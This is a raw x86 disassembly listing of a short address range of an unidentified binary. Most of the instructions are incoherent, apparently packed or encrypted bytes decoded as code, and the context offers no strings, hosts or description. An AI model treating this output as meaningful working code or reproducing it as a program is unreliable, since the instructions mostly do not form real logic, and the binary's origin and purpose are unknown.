  40a989:	sti    
  40a98a:	mov    cl,0x9e
  40a98c:	jge    0x40a9b4
  40a98e:	pop    ss
  40a98f:	int    0x1e
  40a991:	int3   
  40a992:	add    BYTE PTR [ebx-0x36],bh
  40a995:	fisub  WORD PTR [esi]
  40a997:	cld    
  40a998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a999:	sub    ch,cl
  40a99b:	mov    bh,0x37
  40a99d:	(bad)  
  40a99f:	push   ss
  40a9a0:	inc    ebx
  40a9a1:	cmc    
  40a9a2:	sbb    DWORD PTR [esi],ebx
  40a9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a5:	sar    DWORD PTR [edi+eiz*2],1
  40a9a8:	pusha  
  40a9a9:	leave  
  40a9aa:	mov    ecx,0x212cdf5b
  40a9af:	out    dx,eax
  40a9b0:	adc    cl,dl
  40a9b2:	ins    DWORD PTR es:[edi],dx
  40a9b3:	push   ecx
  40a9b4:	push   edx
  40a9b5:	cmp    eax,0xfe69583e
  40a9ba:	xchg   esi,eax
  40a9bb:	jo     0x40a970
  40a9bd:	or     BYTE PTR [edi-0x1afb07da],0x17
  40a9c4:	stos   DWORD PTR es:[edi],eax
  40a9c5:	leave  
  40a9c6:	mov    dl,BYTE PTR [esi+edx*1+0x26a8f597]
  40a9cd:	lahf   
  40a9ce:	mov    esp,esp
  40a9d0:	jp     0x40a9ab
  40a9d2:	in     eax,dx
  40a9d3:	push   0x5a
  40a9d5:	add    al,0xb0
  40a9d7:	jb     0x40aa27
  40a9d9:	rcl    BYTE PTR [ecx+0x5b],cl
  40a9dc:	or     BYTE PTR [ebx-0x62],bh
  40a9df:	pop    ds
  40a9e0:	test   BYTE PTR [ebx],dl
  40a9e2:	sti    
  40a9e3:	sar    BYTE PTR [edx],cl
  40a9e5:	push   0x1e
  40a9e7:	sahf   
  40a9e8:	neg    edi
  40a9ea:	jecxz  0x40a9eb
  40a9ec:	push   eax
  40a9ed:	cmp    esp,DWORD PTR [edi-0x43]
  40a9f0:	inc    ebx
  40a9f1:	pop    ebx
  40a9f2:	jecxz  0x40a9b6
  40a9f4:	rol    edx,1
  40a9f6:	sub    eax,DWORD PTR [ebx+eiz*8]
  40a9f9:	inc    edi
  40a9fa:	inc    edx
  40a9fb:	hlt    
  40a9fc:	cmp    al,0x43
  40a9fe:	nop
  40a9ff:	dec    ebp
  40aa00:	daa    
  40aa01:	pop    ebp
  40aa02:	adc    BYTE PTR [eax],ah
  40aa04:	add    DWORD PTR [eax+eiz*1-0x1b],esp
  40aa08:	xor    eax,0xea5bb798
  40aa0d:	pop    ecx
  40aa0e:	sub    DWORD PTR [eax],0x6a
  40aa11:	and    eax,0xf7d52774
  40aa16:	sub    ebx,DWORD PTR [ebp+0x45]
  40aa19:	xchg   ecx,eax
  40aa1a:	cwde   
  40aa1b:	dec    ebp
  40aa1c:	imul   ecx,DWORD PTR [ecx+0x3c1e1fa9],0x3e
  40aa23:	push   esi
  40aa24:	adc    al,0xee
  40aa26:	push   ebp
  40aa27:	sub    edi,DWORD PTR [ebp+0x5acc7a18]
  40aa2d:	mov    ds:0xfd39808d,eax
  40aa32:	mov    ah,0xfd
  40aa34:	fldcw  WORD PTR [eax+0x2]
  40aa37:	mov    bl,BYTE PTR [eax]
  40aa39:	cmp    eax,0xcf828575
  40aa3e:	xlat   BYTE PTR ds:[ebx]
  40aa3f:	iret   
  40aa40:	imul   esp,DWORD PTR es:[ecx+ecx*2-0x4e57c098],0xb2ed6daa
  40aa4c:	and    BYTE PTR [edx],0xb5
  40aa4f:	jo     0x40aa41
  40aa51:	xor    ecx,DWORD PTR [ebx]
  40aa53:	jns    0x40aaa7
  40aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa56:	ins    DWORD PTR es:[edi],dx
  40aa57:	das    
  40aa58:	inc    ebx
  40aa59:	sub    dh,BYTE PTR [ecx]
  40aa5b:	sub    eax,0xba65a041
  40aa60:	push   esp
  40aa61:	aad    0x16
  40aa63:	fild   QWORD PTR [bx+di+0x3b]
  40aa67:	aaa    
  40aa68:	(bad)  
  40aa69:	add    DWORD PTR [esi+0x25b853c5],ecx
  40aa6f:	shl    esi,0x3d
  40aa72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa73:	dec    edx
  40aa74:	mov    ds:0x85c52b75,eax
  40aa79:	rol    BYTE PTR [ebp+0x3e],cl
  40aa7c:	adc    edx,esi
  40aa7e:	outs   dx,DWORD PTR ds:[esi]
  40aa7f:	sbb    bh,ah
  40aa81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa82:	or     al,0x95
  40aa84:	js     0x40aaf9
  40aa86:	outs   dx,BYTE PTR ds:[esi]
  40aa87:	call   0x4c1dafbd
  40aa8c:	pop    ebx
  40aa8d:	(bad)  
  40aa8e:	gs mov al,0x8a
  40aa91:	js     0x40aa65
  40aa93:	pop    ebp
  40aa94:	repnz cwde 
  40aa96:	std    
  40aa97:	enter  0x53df,0x89
  40aa9b:	xchg   ecx,eax
  40aa9c:	int3   
  40aa9d:	inc    edx
  40aa9e:	and    edi,DWORD PTR [esi]
  40aaa0:	fadd   QWORD PTR [edx+0x20e5be59]
  40aaa6:	fldenv [edi]
  40aaa8:	or     edx,0x78
  40aaab:	xor    DWORD PTR [eax+0x4f],esi
  40aaae:	fmul   DWORD PTR ds:0x6c3e7023
  40aab4:	jmp    0x6e497eb3
  40aab9:	push   0xfffffffe
  40aabb:	je     0x40aafd
  40aabd:	jmp    FWORD PTR [ebx+0x579988b4]
  40aac3:	das    
  40aac4:	sbb    al,0xc8
  40aac6:	xor    dh,BYTE PTR [edx]
  40aac8:	jno    0x40ab1f
  40aaca:	fnstcw WORD PTR [ebx-0x67]
  40aacd:	mov    ebx,0x3c27d498
  40aad2:	das    
  40aad3:	nop
  40aad4:	enter  0xcb14,0x63
  40aad8:	call   0x5f36:0xea1a7758
  40aadf:	repz lock cld 
  40aae2:	push   0xffffffbd
  40aae4:	jne    0x40aa77
  40aae6:	xor    al,0xdd
  40aae8:	jnp    0x40ab61
  40aaea:	add    BYTE PTR [edx-0x1e],bl
  40aaed:	xor    DWORD PTR [eax+0x19],eax
  40aaf0:	pop    edx
  40aaf1:	sbb    ah,BYTE PTR [edi-0x6a]
  40aaf4:	test   al,0xec
  40aaf6:	mov    cl,0x7e
  40aaf8:	push   es
  40aaf9:	int3   
  40aafa:	jle    0x40ab61
  40aafc:	sar    DWORD PTR [edi+0xf],1
  40aaff:	add    eax,0x5ec85f53
  40ab04:	loopne 0x40aacf
  40ab06:	repnz push es
  40ab08:	mov    cl,0x35
  40ab0a:	test   eax,0xf54527fe
  40ab0f:	jo     0x40ab0d
  40ab11:	push   esp
  40ab12:	mov    cs,WORD PTR [esi]
  40ab14:	hlt    
  40ab15:	in     al,dx
  40ab16:	aam    0x6
  40ab18:	pushf  
  40ab19:	les    ebp,FWORD PTR [ebp+0x2d]
  40ab1c:	and    eax,0x375c525c
  40ab21:	out    0x7,al
  40ab23:	xlat   BYTE PTR ds:[ebx]
  40ab24:	sbb    DWORD PTR [eax],esp
  40ab26:	mov    al,0x1d
  40ab28:	int3   
  40ab29:	or     BYTE PTR [edx-0x5d],al
  40ab2c:	ror    DWORD PTR [edi-0x19faa542],cl
  40ab32:	scas   eax,DWORD PTR es:[edi]
  40ab33:	jmp    0x1316f229
  40ab38:	dec    ecx
  40ab39:	xor    BYTE PTR [ebp+0x3f97521f],0x84
  40ab40:	pop    ss
  40ab41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab42:	mov    edx,0xdb878b6a
  40ab47:	jmp    0x13effb28
  40ab4c:	add    al,0x77
  40ab4e:	sub    ecx,esp
  40ab50:	or     edx,ecx
  40ab52:	aad    0x99
  40ab54:	in     al,dx
  40ab55:	gs xchg ebp,eax
  40ab57:	stc    
  40ab58:	iret   
  40ab59:	cdq    
  40ab5a:	cmp    al,0x3c
  40ab5c:	and    esi,edx
  40ab5e:	mov    al,ds:0x3b0e696e
  40ab63:	and    BYTE PTR [edx],dl
  40ab65:	std    
  40ab66:	or     BYTE PTR [eax],cl
  40ab68:	jg     0x40abca
  40ab6a:	loop   0x40ab85
  40ab6c:	xor    eax,0x3bf4381b
  40ab71:	shr    DWORD PTR [esi+0x54f017fa],cl
  40ab77:	loopne 0x40abd5
  40ab79:	jnp    0x40abde
  40ab7b:	test   BYTE PTR [ecx+0xa],dh
  40ab7e:	inc    edi
  40ab7f:	das    
  40ab80:	jge    0x40ab50
  40ab82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab83:	jmp    0x100e:0xb808e4eb
  40ab8a:	cmp    edx,ebx
  40ab8c:	stos   BYTE PTR es:[edi],al
  40ab8d:	rcl    DWORD PTR [ecx],0xa9
  40ab90:	test   eax,0xbb9c06c6
  40ab95:	ret    
  40ab96:	adc    edx,ebx
  40ab98:	jle    0x40aba1
  40ab9a:	inc    edx
  40ab9b:	mov    dl,0x59
  40ab9d:	or     al,0x12
  40ab9f:	cdq    
  40aba0:	xchg   edi,eax
  40aba1:	loopne 0x40abf9
  40aba3:	add    al,0x3e
  40aba5:	test   BYTE PTR [eax+ebp*4+0x35],0x2a
  40abaa:	jbe    0x40abb8
  40abac:	fdiv   DWORD PTR [edx-0x5f82d5c1]
  40abb2:	mov    cl,0xb2
  40abb4:	sbb    BYTE PTR [ebx+0x5a04c301],cl
  40abba:	ja     0x40aba2
  40abbc:	dec    esp
  40abbd:	jge    0x40ab9b
  40abbf:	jmp    0xf84:0x801e8a11
  40abc6:	push   ebx
  40abc7:	cmc    
  40abc8:	xchg   esp,eax
  40abc9:	push   ecx
  40abca:	sbb    eax,0x707722c7
  40abcf:	or     al,0xcf
  40abd1:	mov    ds:0xd80d562c,eax
  40abd6:	stos   BYTE PTR es:[edi],al
  40abd7:	mov    esp,0x78222f71
  40abdc:	mov    DWORD PTR [ebp+0x23],0x511fcc43
  40abe3:	mov    dh,0x1
  40abe5:	inc    ebx
  40abe6:	mov    ds:0xb7126e09,eax
  40abeb:	xor    BYTE PTR [ecx-0x50],0x94
  40abef:	(bad)  [esi]
  40abf1:	sbb    eax,0x1d024ac
  40abf6:	push   ss
  40abf7:	gs loopne 0x40abfe
  40abfa:	out    0xc8,al
  40abfc:	sbb    dh,BYTE PTR [ebx]
  40abfe:	sti    
  40abff:	mov    esi,0x3c3ba851
  40ac04:	xchg   edx,eax
  40ac05:	ss sti 
  40ac07:	xchg   DWORD PTR [edi],ebx
  40ac09:	sbb    al,0x64
  40ac0b:	jge    0x40ac4e
  40ac0d:	push   0x5a
  40ac0f:	nop
  40ac10:	push   esp
  40ac11:	retf   
  40ac12:	sbb    al,0x36
  40ac14:	in     al,0x8b
  40ac16:	mov    ss,WORD PTR [edi-0x4e]
  40ac19:	cwde   
  40ac1a:	jno    0x40ac71
  40ac1c:	or     dl,ch
  40ac1e:	fmul   DWORD PTR [eax]
  40ac20:	mov    al,0xc
  40ac22:	and    BYTE PTR [eax+0x26c034d1],bh
  40ac28:	ret    
  40ac29:	sahf   
  40ac2a:	out    0x79,al
  40ac2c:	loopne 0x40ac7f
  40ac2e:	shl    BYTE PTR [ecx-0x4e],1
  40ac31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac32:	dec    eax
  40ac33:	mov    bh,0xa9
  40ac35:	(bad)  
  40ac36:	sbb    eax,0xda4168e3
  40ac3b:	and    eax,0xe04086c1
  40ac40:	inc    ecx
  40ac41:	mov    ah,0x23
  40ac43:	ins    BYTE PTR es:[edi],dx
  40ac44:	pop    ebp
  40ac45:	push   edi
  40ac46:	xchg   esp,eax
  40ac47:	jle    0x40ac80
  40ac49:	mov    esp,0x7c96a2b3
  40ac4e:	mov    DWORD PTR [edi],edi
  40ac50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac51:	dec    ecx
  40ac52:	pop    ecx
  40ac53:	jmp    0x65e7544a
  40ac58:	xor    bh,BYTE PTR ds:0xa2ef2803
  40ac5e:	cs or  dh,al
  40ac61:	xor    esi,DWORD PTR [esi-0x6f]
  40ac64:	aaa    
  40ac65:	add    ah,BYTE PTR [esi+0x9839428]
  40ac6b:	ja     0x40aca0
  40ac6d:	js     0x40ac4a
  40ac6f:	sbb    BYTE PTR [ecx],ch
  40ac71:	push   ss
  40ac72:	fdivr  DWORD PTR [ebp+0x55b7b964]
  40ac78:	fcom   DWORD PTR [esi-0x6f]
  40ac7b:	push   edi
  40ac7c:	mov    edx,0xf971b05d
  40ac81:	aam    0x5d
  40ac83:	aad    0x8a
  40ac85:	push   0x7068f5cd
  40ac8a:	sti    
  40ac8b:	ins    DWORD PTR es:[edi],dx
  40ac8c:	push   ds
  40ac8d:	mov    eax,0x53b828fc
  40ac92:	push   edi
  40ac93:	repnz lahf 
  40ac95:	mov    esi,0xb4e7f642
  40ac9a:	xchg   edx,eax
  40ac9b:	jge    0x40ac29
  40ac9d:	dec    esi
  40ac9e:	add    BYTE PTR [edi-0x3c7453fe],dh
  40aca4:	jecxz  0x40ad0a
  40aca6:	dec    ebx
  40aca7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40aca9:	enter  0x3ce9,0x37
  40acad:	cmp    BYTE PTR [ecx+ebx*1],ah
  40acb0:	test   eax,0x7c1b5ced
  40acb5:	(bad)  
  40acb7:	imul   ebp,DWORD PTR [eax],0xffffffa1
  40acba:	push   esi
  40acbb:	push   0x61fd681a
  40acc0:	and    edi,ebp
  40acc2:	in     al,dx
  40acc3:	sti    
  40acc4:	xor    ah,BYTE PTR [esi-0x70f99bcf]
  40acca:	mov    bh,0x12
  40accc:	enter  0x35fb,0xb6
  40acd0:	sbb    ebx,ebp
  40acd2:	sub    BYTE PTR [ebx+0x7464b75b],ah
  40acd8:	or     ah,BYTE PTR [eax-0x713f2976]
  40acde:	xchg   ecx,eax
  40acdf:	gs es cdq 
  40ace2:	mov    dh,0x5c
  40ace4:	pop    es
  40ace5:	dec    esp
  40ace6:	sbb    al,0xd5
  40ace8:	test   al,0xd2
  40acea:	gs pop es
  40acec:	icebp  
  40aced:	imul   esi,DWORD PTR [ebp+0x49954e6c],0x45
  40acf4:	mov    WORD PTR [ebx+0x1925a988],?
  40acfa:	in     eax,dx
  40acfb:	lahf   
  40acfc:	sub    eax,0xa44ca635
  40ad01:	in     al,dx
  40ad02:	std    
  40ad03:	and    BYTE PTR [ebp+0x2e],al
  40ad06:	shl    BYTE PTR [edx],cl
  40ad08:	int    0x27
  40ad0a:	sbb    dh,BYTE PTR [edi-0x1292bdd6]
  40ad10:	or     DWORD PTR [ebp-0x5a],ebp
  40ad13:	sub    ecx,DWORD PTR [esi-0x20a7f4f2]
  40ad19:	mov    edx,0x21b85b6d
  40ad1e:	sbb    eax,0xf8ffd165
  40ad23:	fwait
  40ad24:	xor    al,0x48
  40ad26:	jo     0x40ad55
  40ad28:	mov    eax,ds:0x85fb9cfb
  40ad2d:	sbb    bh,0xd
  40ad30:	fsubr  DWORD PTR [edi+0x353de772]
  40ad36:	out    dx,eax
  40ad37:	(bad)  
  40ad38:	jmp    0x37d:0x26a0f05b
  40ad3f:	sub    ebp,DWORD PTR [eax]
  40ad41:	sub    eax,0x87cfa830
  40ad46:	fsub   DWORD PTR [ebx-0x37fc0cd7]
  40ad4c:	jbe    0x40ad8a
  40ad4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad4f:	loope  0x40ad4e
  40ad51:	cwde   
  40ad52:	cmp    eax,0xbc777b7c
  40ad57:	aam    0x79
  40ad59:	fcomp  QWORD PTR [edi+0x49]
  40ad5c:	xor    al,0xb3
  40ad5e:	jne    0x40ad3d
  40ad60:	xor    al,0xfc
  40ad62:	ror    BYTE PTR [ebp-0x8],0x95
  40ad66:	ins    DWORD PTR es:[edi],dx
  40ad67:	cmp    bl,bl
  40ad69:	add    al,BYTE PTR [ebx]
  40ad6b:	call   0x3012:0xe84df010
  40ad72:	sub    eax,0x60e56b89
  40ad77:	mov    ds:0xd3e71c0f,al
  40ad7c:	sub    DWORD PTR [edi],0x21b2198e
  40ad82:	adc    esp,0xffffffcc
  40ad85:	mov    dl,0x93
  40ad87:	in     eax,0x60
  40ad89:	jae    0x40adb9
  40ad8b:	xor    al,BYTE PTR [esp+ebx*2-0x65]
  40ad8f:	nop
  40ad90:	jae    0x40ad8b
  40ad92:	mov    esi,0x4e68f33
  40ad97:	(bad)  
  40ad98:	jp     0x40ad78
  40ad9a:	shl    BYTE PTR [esi-0x70],1
  40ad9d:	sub    bl,bl
  40ad9f:	cmp    edi,DWORD PTR [esi]
  40ada1:	adc    bl,BYTE PTR [edi-0x52]
  40ada4:	repnz fidivr DWORD PTR [edi+0x5b]
  40ada8:	sub    BYTE PTR ds:0x42f8512c,dh
  40adae:	xchg   ecx,eax
  40adaf:	and    al,0x34
  40adb1:	test   DWORD PTR [edx-0x51],edi
  40adb4:	mov    dh,0xcf
  40adb6:	lods   eax,DWORD PTR ds:[esi]
  40adb7:	shr    BYTE PTR [ebx],cl
  40adb9:	repnz xor ch,BYTE PTR [ecx-0x58f76fc3]
  40adc0:	(bad)  
  40adc1:	aam    0x20
  40adc3:	stos   DWORD PTR es:[edi],eax
  40adc4:	xchg   ebp,eax
  40adc5:	mov    bl,0xbf
  40adc7:	xor    al,0x30
  40adc9:	(bad)  
  40adca:	adc    edx,ebp
  40adcc:	or     al,BYTE PTR [ebx+0x22b3cd0e]
  40add2:	cld    
  40add3:	fcmovnbe st,st(1)
  40add5:	cld    
  40add6:	mov    al,0xb1
  40add8:	mov    al,0xb6
  40adda:	and    DWORD PTR [esi+0x79f349a0],ebx
  40ade0:	inc    edi
  40ade1:	xchg   esi,eax
  40ade2:	mov    al,BYTE PTR ss:[esi+0x18]
  40ade6:	adc    bl,BYTE PTR [esi-0x5b]
  40ade9:	imul   edi,DWORD PTR [edi],0xd36c2b00
  40adef:	xor    dh,BYTE PTR [ecx+0x6cdb4a]
  40adf5:	clc    
  40adf6:	in     eax,0x37
  40adf8:	mov    ecx,0x922345c
  40adfd:	and    ebx,DWORD PTR [ecx-0x75]
  40ae00:	jmp    0x40ae20
  40ae02:	xlat   BYTE PTR ds:[ebx]
  40ae03:	add    BYTE PTR [ebx-0x64],bl
  40ae06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae07:	lods   eax,DWORD PTR ds:[esi]
  40ae08:	loope  0x40ae00
  40ae0a:	and    ah,bh
  40ae0c:	mov    cs,edi
  40ae0e:	jge    0x40ad94
  40ae10:	aam    0x7d
  40ae12:	jmp    0x40ae77
  40ae14:	push   DWORD PTR [edx-0x74]
  40ae17:	xor    BYTE PTR [ebx+0x4fe3bd5d],ch
  40ae1d:	lods   eax,DWORD PTR ds:[esi]
  40ae1e:	int3   
  40ae1f:	mov    ss,WORD PTR [edx+esi*8]
  40ae22:	iret   
  40ae23:	jbe    0x40adbb
  40ae25:	out    0x79,al
  40ae27:	jp     0x40adbc
  40ae29:	loopne 0x40ae03
  40ae2b:	aad    0xf2
  40ae2d:	rol    BYTE PTR [edx+ecx*2+0x6a89ea38],cl
  40ae34:	dec    ebp
  40ae35:	jbe    0x40ae53
  40ae37:	jb     0x40ae61
  40ae39:	jmp    0x40ae81
  40ae3b:	sbb    eax,ebp
  40ae3d:	adc    al,0xcd
  40ae3f:	dec    esp
  40ae40:	pop    esp
  40ae41:	loopne 0x40ae8e
  40ae43:	pop    ds
  40ae44:	push   0xffffffe7
  40ae46:	lahf   
  40ae47:	retf   0xb9fc
  40ae4a:	rcl    BYTE PTR [edx],0x26
  40ae4d:	jne    0x40ae2d
  40ae4f:	sub    ebp,DWORD PTR [eax+0x4305c2c6]
  40ae55:	icebp  
  40ae56:	sbb    BYTE PTR [esp+ebp*2],cl
  40ae59:	cmc    
  40ae5a:	push   ebx
  40ae5b:	xchg   DWORD PTR [edi],esi
  40ae5d:	mov    ebx,0xba6d7e95
  40ae62:	les    edi,FWORD PTR [eax+0x1a45279d]
  40ae68:	or     dl,BYTE PTR [esi]
  40ae6a:	push   ss
  40ae6b:	out    0xad,al
  40ae6d:	adc    al,0x59
  40ae6f:	jb     0x40ae77
  40ae71:	inc    edi
  40ae72:	xor    edx,DWORD PTR [ecx+0x23]
  40ae75:	callw  0x262a
  40ae79:	xor    eax,0xa69dca2b
  40ae7e:	xchg   DWORD PTR [esi-0x307f7405],ebp
  40ae84:	add    al,BYTE PTR ds:0xee46b19f
  40ae8a:	push   cs
  40ae8b:	jne    0x40af04
  40ae8d:	(bad)  
  40ae8e:	bound  eax,QWORD PTR [ebx+0x1a]
  40ae91:	cmp    BYTE PTR [edi],ch
  40ae93:	jbe    0x40ae6c
  40ae95:	push   esi
  40ae96:	retf   0x691e
  40ae99:	xchg   esi,eax
  40ae9a:	daa    
  40ae9b:	pop    edi
  40ae9c:	cmc    
  40ae9d:	pusha  
  40ae9e:	xchg   DWORD PTR [esi],ebp
  40aea0:	pop    esi
  40aea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea2:	sbb    eax,ecx
  40aea4:	fsub   st,st(3)
  40aea6:	jns    0x40af0d
  40aea8:	(bad)  
  40aeaa:	sti    
  40aeab:	retf   0x7908
  40aeae:	js     0x40af0a
  40aeb0:	inc    ebx
  40aeb1:	(bad)  
  40aeb2:	enter  0xd22c,0x64
  40aeb6:	in     al,dx
  40aeb7:	repnz fdiv DWORD PTR ds:0xce8fb362
  40aebe:	hlt    
  40aebf:	fimul  DWORD PTR ds:0xccdc33a8
  40aec5:	sbb    cl,al
  40aec7:	retf   
  40aec8:	or     al,0xe5
  40aeca:	stos   BYTE PTR es:[edi],al
  40aecb:	mov    DWORD PTR [esi-0xa],ecx
  40aece:	mov    ecx,0xf4319f96
  40aed3:	scas   eax,DWORD PTR es:[edi]
  40aed4:	scas   eax,DWORD PTR es:[edi]
  40aed5:	or     ecx,DWORD PTR [edi+ebx*1+0x340ca6b3]
  40aedc:	jae    0x40ae7f
  40aede:	and    ch,ah
  40aee0:	sub    dh,BYTE PTR [ecx-0x34763cd4]
  40aee6:	adc    al,0x64
  40aee8:	int3   
  40aee9:	les    eax,FWORD PTR [ebp+0xf]
  40aeec:	mov    edx,ds
  40aeee:	sahf   
  40aeef:	pushf  
  40aef0:	cmp    BYTE PTR [edx+0x531559c3],dh
  40aef6:	lods   al,BYTE PTR ds:[esi]
  40aef7:	or     esp,esi
  40aef9:	inc    ebp
  40aefa:	add    BYTE PTR [edx+ebp*1+0x3f569f2b],0x2c
  40af02:	loop   0x40aea5
  40af04:	sbb    ecx,0x2
  40af07:	cmc    
  40af08:	and    al,0x8c
  40af0a:	dec    eax
  40af0b:	sahf   
  40af0c:	(bad)  [esi]
  40af0e:	jecxz  0x40aebe
  40af10:	jl     0x40af0b
  40af12:	pop    esi
  40af13:	jl     0x40aed7
  40af15:	mov    WORD PTR [edx],es
  40af17:	push   ss
  40af18:	js     0x40af47
  40af1a:	xchg   ebp,eax
  40af1b:	lahf   
  40af1c:	dec    edi
  40af1d:	out    dx,eax
  40af1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af1f:	call   DWORD PTR [edi+0x1d]
  40af22:	xor    eax,0x43b482ea
  40af27:	out    0xff,al
  40af29:	repnz cmp eax,DWORD PTR ds:0xe88787e3
  40af30:	adc    al,0x78
  40af32:	mov    WORD PTR [eax+0x5a],cs
  40af35:	scas   al,BYTE PTR es:[edi]
  40af36:	ror    DWORD PTR [eax-0x2ef947b1],0xfe
  40af3d:	int    0x3e
  40af3f:	(bad)  
  40af40:	jle    0x40af8a
  40af42:	je     0x40aed5
  40af44:	jmp    0x96766549
  40af49:	mov    DWORD PTR [edx+ebx*2],esp
  40af4c:	sbb    cl,ch
  40af4e:	cld    
  40af4f:	rcr    ebp,cl
  40af51:	mov    edi,0xffac2b75
  40af56:	mov    al,ds:0x69baf79e
  40af5b:	cmc    
  40af5c:	push   0xffffffc6
  40af5e:	mov    WORD PTR [ecx+eax*1-0x26],fs
  40af62:	sbb    ecx,DWORD PTR [edi+ecx*4-0x13]
  40af66:	push   eax
  40af67:	pop    ds
  40af68:	imul   esp,edx,0x969053ff
  40af6e:	mov    dh,0xe4
  40af70:	aas    
  40af71:	pop    eax
  40af72:	pop    ebx
  40af73:	retf   
  40af74:	jbe    0x40af39
  40af76:	mov    bl,0xb0
  40af78:	xchg   ebp,eax
  40af79:	fsubr  DWORD PTR [ebx]
  40af7b:	sbb    cl,BYTE PTR [esi+0x4c1d46c4]
  40af81:	test   al,0xf3
  40af83:	and    cl,ah
  40af85:	aam    0x9b
  40af87:	jnp    0x40afed
  40af89:	xor    BYTE PTR [edx+0xb],cl
  40af8c:	and    ebp,edi
  40af8e:	pop    ecx
  40af8f:	test   eax,0x5270d6c4
  40af94:	test   eax,0xa8a36c90
  40af99:	icebp  
  40af9a:	push   eax
  40af9b:	jl     0x40afe0
  40af9d:	ds stos DWORD PTR es:[edi],eax
  40af9f:	and    BYTE PTR [eax+0x7094cd0e],ch
  40afa5:	call   0xf3eb:0xf67ba209
  40afac:	gs adc eax,0xf29aad5
  40afb2:	mov    dl,0x71
  40afb4:	icebp  
  40afb5:	jno    0x40afcb
  40afb7:	loop   0x40aff4
  40afb9:	dec    esi
  40afba:	inc    edx
  40afbb:	sbb    dh,BYTE PTR [edx-0x243ed63]
  40afc1:	jl     0x40afed
  40afc3:	cmp    BYTE PTR [edx],bh
  40afc5:	sti    
  40afc6:	xchg   DWORD PTR [ebx+0x35],eax
  40afc9:	xchg   ecx,eax
  40afca:	mov    dh,BYTE PTR [eax]
  40afcc:	in     al,0x8b
  40afce:	inc    ebp
  40afcf:	cld    
  40afd0:	xor    eax,esi
  40afd2:	add    eax,edi
  40afd4:	mov    DWORD PTR [ebp-0x10],eax
  40afd7:	mov    ebx,0x65655
  40afdc:	add    ebx,0x3234
  40afe2:	xchg   ebx,esi
  40afe4:	xor    ebx,ebx
  40afe6:	push   esi
  40afe7:	mov    esi,ebx
  40afe9:	pop    ebx
  40afea:	mov    edx,esi
  40afec:	jmp    0x40d37e
  40aff1:	cli    
  40aff2:	mov    DWORD PTR [ecx-0x65b47dad],esi
  40aff8:	add    BYTE PTR ds:0xd29b0d0,0x95
  40afff:	dec    edi
  40b000:	adc    eax,0x8383f429
  40b005:	or     al,0x5e
  40b007:	add    DWORD PTR [ebx-0x4aa8dd17],0xffffffd2
  40b00e:	popf   
  40b00f:	cmp    al,cl
  40b011:	sbb    al,0x3e
  40b013:	ins    DWORD PTR es:[edi],dx
  40b014:	xchg   edx,eax
  40b015:	sahf   
  40b016:	cmc    
  40b017:	std    
  40b018:	pop    ebx
  40b019:	ret    
  40b01a:	jae    0x40b033
  40b01c:	jns    0x40b05b
  40b01e:	jp     0x40b068
  40b020:	sbb    al,0x34
  40b022:	sub    dl,cl
  40b024:	aaa    
  40b025:	lahf   
  40b026:	xchg   BYTE PTR gs:[esi+0x451b9f83],ch
  40b02d:	add    eax,0xe7c9fd8c
  40b032:	retf   0x5fff
  40b035:	ror    al,1
  40b037:	ja     0x40b08a
  40b039:	inc    eax
  40b03a:	fild   DWORD PTR [esi-0x3f90bf95]
  40b040:	rol    BYTE PTR [ecx],cl
  40b042:	pop    ebx
  40b043:	jg     0x40b094
  40b045:	dec    ecx
  40b046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b047:	mov    ebp,0x6131e3cc
  40b04c:	inc    edi
  40b04d:	push   es
  40b04e:	inc    esi
  40b04f:	jns    0x40b046
  40b051:	fs loopne 0x40b03b
  40b054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b055:	jp     0x40b063
  40b057:	dec    edx
  40b058:	adc    eax,0xd426155c
  40b05d:	sub    eax,0xb87af1b1
  40b062:	xchg   esi,eax
  40b063:	pushf  
  40b064:	addr16 xchg ebx,eax
  40b066:	pusha  
  40b067:	cmp    al,0x62
  40b069:	sbb    DWORD PTR [ebx-0x71813573],0x6c
  40b070:	inc    esi
  40b071:	sub    BYTE PTR [edi],ah
  40b073:	fsub   DWORD PTR [esi-0x5b5a75d8]
  40b079:	jge    0x40b036
  40b07b:	mov    dh,0xf
  40b07d:	pusha  
  40b07e:	loopne 0x40b076
  40b080:	or     esi,ebp
  40b082:	pop    eax
  40b083:	push   esi
  40b084:	add    edx,DWORD PTR [edi+0x6f4f8aa6]
  40b08a:	lods   eax,DWORD PTR ds:[esi]
  40b08b:	dec    ecx
  40b08c:	push   eax
  40b08e:	mov    bl,BYTE PTR [edx+0x2b52b82a]
  40b094:	cmp    eax,DWORD PTR [esi]
  40b096:	mov    ss:0x2b171c18,al
  40b09c:	lds    edx,FWORD PTR [edi+0x2c998d53]
  40b0a2:	shl    bh,0xeb
  40b0a5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a7:	in     al,0x21
  40b0a9:	cmp    BYTE PTR ds:0x4eee8596,dh
  40b0af:	sbb    BYTE PTR [edx],bl
  40b0b1:	add    esp,esp
  40b0b3:	dec    esi
  40b0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b5:	cwde   
  40b0b6:	rcpps  xmm1,XMMWORD PTR [ebx+0x64da6266]
  40b0bd:	and    BYTE PTR [edx],cl
  40b0bf:	inc    esp
  40b0c0:	add    al,0xa
  40b0c2:	sti    
  40b0c3:	mov    ebx,0x247f1b13
  40b0c8:	sub    ah,bl
  40b0ca:	mov    edx,0xcf48abd5
  40b0cf:	and    al,0x44
  40b0d1:	ja     0x40b058
  40b0d3:	sbb    eax,DWORD PTR [esi]
